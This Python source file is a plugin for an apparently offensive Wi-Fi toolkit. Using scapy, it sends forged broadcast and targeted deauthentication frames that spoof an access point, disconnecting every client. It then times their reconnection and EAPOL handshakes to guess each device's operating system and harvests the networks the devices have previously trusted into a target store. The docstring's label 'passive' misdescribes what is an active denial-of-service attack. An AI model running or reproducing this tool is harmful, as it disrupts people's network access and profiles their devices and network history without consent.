from core.plugin_manager import BasePlugin
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11ProbeReq, EAPOL, sniff, sendp
import asyncio
import threading
import time

# Empirical OS timing signatures (reconnect_ms, eapol_spacing_ms, probe_pattern)
_OS_SIGS = {
    "iOS":     {"reconnect": (50,  200), "eapol": (10, 50),  "probe": "mixed"},
    "macOS":   {"reconnect": (100, 300), "eapol": (20, 80),  "probe": "directed"},
    "Android": {"reconnect": (150, 400), "eapol": (30, 100), "probe": "broadcast"},
    "Windows": {"reconnect": (300, 700), "eapol": (50, 150), "probe": "directed"},
    "Linux":   {"reconnect": (100, 600), "eapol": (10, 200), "probe": "mixed"},
}


class WiFiFingerprinterPlugin(BasePlugin):
    """
    Passive device OS fingerprinting via deauth/reconnect behavioral timing.

    Sends a targeted deauth burst, then measures three signals per device:
      1. Reconnect latency (ms from deauth to first probe request)
      2. Probe request pattern (null-SSID broadcast vs directed vs mixed)
      3. EAPOL inter-frame timing (spacing between 4-way handshake messages)

    Correlates these against known OS timing profiles to classify device
    OS and firmware without sending any identifying packet beyond the deauth.
    Also captures prior SSID history from probe requests (previous networks
    the device has trusted).
    """

    def __init__(self):
        self.running = False
        self.profiles: dict[str, dict] = {}
        self.interface = "wlan0"
        self._sessions: dict[str, dict] = {}

    @property
    def name(self) -> str:
        return "WiFi-Fingerprinter"

    @property
    def description(self) -> str:
        return "OS fingerprinting via deauth/reconnect behavioral timing analysis"

    async def start(self, interface: str = "wlan0"):
        self.interface = interface
        self.running = True
        self.log_event("WiFi-Fingerprinter ready", "START")

    async def stop(self):
        self.running = False

    async def fingerprint_ap(self, bssid: str, timeout: int = 35) -> dict:
        """Deauth all clients on bssid, observe reconnection behavior."""
        self._sessions.clear()
        done = threading.Event()
        self.log_event(f"Fingerprinting clients on {bssid}", "SCAN")

        def _sniff():
            def _pkt(pkt):
                if not self.running:
                    done.set()
                    return
                ts = time.time()

                if pkt.haslayer(Dot11ProbeReq):
                    mac = pkt[Dot11].addr2 or ""
                    if mac and mac != "ff:ff:ff:ff:ff:ff":
                        sess = self._sessions.setdefault(
                            mac, {"probes": [], "eapol_times": [], "deauth_ts": None}
                        )
                        ssid = pkt[Dot11ProbeReq].info.decode(errors="replace") if pkt[Dot11ProbeReq].info else ""
                        rssi = None
                        if pkt.haslayer(RadioTap) and hasattr(pkt[RadioTap], "dBm_AntSignal"):
                            rssi = pkt[RadioTap].dBm_AntSignal
                        sess["probes"].append({"ssid": ssid, "ts": ts, "rssi": rssi})

                if pkt.haslayer(EAPOL):
                    mac = pkt[Dot11].addr2 or ""
                    if mac:
                        sess = self._sessions.setdefault(
                            mac, {"probes": [], "eapol_times": [], "deauth_ts": None}
                        )
                        sess["eapol_times"].append(ts)
                        if len(sess["eapol_times"]) >= 4:
                            done.set()

            sniff(
                iface=self.interface,
                prn=_pkt,
                stop_filter=lambda _: done.is_set() or not self.running,
                timeout=timeout,
            )
            done.set()

        t = threading.Thread(target=_sniff, daemon=True)
        t.start()

        await asyncio.sleep(1.5)

        deauth_ts = time.time()
        # Broadcast deauth + targeted deauth for known clients
        for mac in list(self._sessions.keys()) or []:
            pkt = RadioTap() / Dot11(addr1=mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
            sendp(pkt, iface=self.interface, count=5, verbose=False)
            self._sessions[mac]["deauth_ts"] = deauth_ts

        bcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        sendp(bcast, iface=self.interface, count=5, verbose=False)

        await asyncio.to_thread(done.wait, timeout)

        results = []
        for mac, sess in self._sessions.items():
            if not sess["deauth_ts"]:
                sess["deauth_ts"] = deauth_ts
            profile = _classify(mac, sess)
            self.profiles[mac] = profile
            results.append(profile)
            self.log_event(f"Fingerprinted {mac} → {profile['os_guess']} ({profile['confidence']*100:.0f}%)", "RESULT")
            if self.target_store:
                for dev in self.target_store.devices:
                    if dev.get("mac", "").lower() == mac.lower():
                        dev["os_fingerprint"] = profile["os_guess"]
                        dev["ssid_history"] = profile["ssid_history"]

        self.emit("FINGERPRINT_COMPLETE", {"count": len(results)})
        return {"profiles": results}

    async def get_profiles(self) -> dict:
        return {"profiles": list(self.profiles.values())}


def _classify(mac: str, sess: dict) -> dict:
    probes = sess.get("probes", [])
    eapol_times = sess.get("eapol_times", [])
    deauth_ts = sess.get("deauth_ts")

    reconnect_ms = None
    if deauth_ts and probes:
        first_ts = min(p["ts"] for p in probes)
        reconnect_ms = max(0.0, (first_ts - deauth_ts) * 1000)

    eapol_spacings = []
    if len(eapol_times) >= 2:
        eapol_spacings = [(eapol_times[i + 1] - eapol_times[i]) * 1000 for i in range(len(eapol_times) - 1)]
    avg_eapol = sum(eapol_spacings) / len(eapol_spacings) if eapol_spacings else None

    null_probes = sum(1 for p in probes if not p["ssid"])
    directed = sum(1 for p in probes if p["ssid"])
    if null_probes == 0 and directed > 0:
        probe_pat = "directed"
    elif directed == 0:
        probe_pat = "broadcast"
    else:
        probe_pat = "mixed"

    os_guess, best = "Unknown", 0.0
    for os_name, sig in _OS_SIGS.items():
        score = 0.0
        if reconnect_ms is not None:
            lo, hi = sig["reconnect"]
            if lo <= reconnect_ms <= hi:
                score += 0.5
        if probe_pat == sig["probe"] or sig["probe"] == "mixed":
            score += 0.25
        if avg_eapol is not None:
            lo, hi = sig["eapol"]
            if lo <= avg_eapol <= hi:
                score += 0.25
        if score > best:
            best, os_guess = score, os_name

    return {
        "mac": mac,
        "os_guess": os_guess,
        "confidence": round(best, 2),
        "reconnect_ms": round(reconnect_ms, 1) if reconnect_ms is not None else None,
        "probe_pattern": probe_pat,
        "probe_count": len(probes),
        "ssid_history": list({p["ssid"] for p in probes if p["ssid"]})[:10],
        "eapol_frames": len(eapol_times),
        "eapol_avg_ms": round(avg_eapol, 1) if avg_eapol is not None else None,
    }
